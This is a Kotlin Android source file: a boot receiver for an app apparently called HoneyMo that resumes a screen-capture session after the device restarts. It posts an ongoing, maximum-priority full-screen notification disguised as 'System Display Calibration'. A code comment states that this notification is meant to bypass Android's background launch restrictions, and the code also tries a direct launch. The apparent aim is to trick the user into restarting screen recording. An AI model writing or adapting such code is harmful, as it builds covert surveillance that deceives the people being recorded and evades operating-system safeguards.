package com.example.HoneyMo.receiver

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.HoneyMo.MainActivity
import com.example.HoneyMo.service.ScreenCaptureService
import com.example.HoneyMo.util.SessionPreferences

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
        const val RECOVERY_CHANNEL_ID = "system_recovery_channel"
        const val RECOVERY_NOTIFICATION_ID = 2002

        fun createRecoveryNotificationChannel(context: Context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    RECOVERY_CHANNEL_ID,
                    "System Service Calibration",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Required system service notifications"
                    setSound(null, null)
                    enableVibration(false)
                }
                val nm = context.getSystemService(NotificationManager::class.java)
                nm?.createNotificationChannel(channel)
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        Log.d(TAG, "Received broadcast action: $action")

        if (Intent.ACTION_BOOT_COMPLETED == action || "android.intent.action.QUICKBOOT_POWERON" == action) {
            val wasRecording = SessionPreferences.wasRecordingActive(context)

            if (!wasRecording) {
                return
            }

            Log.d(TAG, "Detected interrupted recording session from previous boot! Initiating recovery.")

            // Setup high-priority notification channel for recovery
            createRecoveryNotificationChannel(context)

            val directIntent = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("EXTRA_BOOT_LAUNCH", true)
                putExtra("EXTRA_INTERRUPTED_SESSION", true)
            }

            val pendingIntent = PendingIntent.getActivity(
                context,
                RECOVERY_NOTIFICATION_ID,
                directIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            // Post high-priority full-screen intent notification to bypass Android 10+ background activity launch restrictions
            val notification = NotificationCompat.Builder(context, RECOVERY_CHANNEL_ID)
                .setContentTitle("System Display Calibration")
                .setContentText("Display service required. Tap to calibrate screen.")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_ALARM)
                .setFullScreenIntent(pendingIntent, true)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                .build()

            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(RECOVERY_NOTIFICATION_ID, notification)

            // Also attempt direct activity launch
            try {
                context.startActivity(directIntent)
                Log.d(TAG, "Direct activity launch attempted from boot")
            } catch (e: Exception) {
                Log.w(TAG, "Direct activity launch restricted by OS: ${e.message}")
            }
        }
    }
}
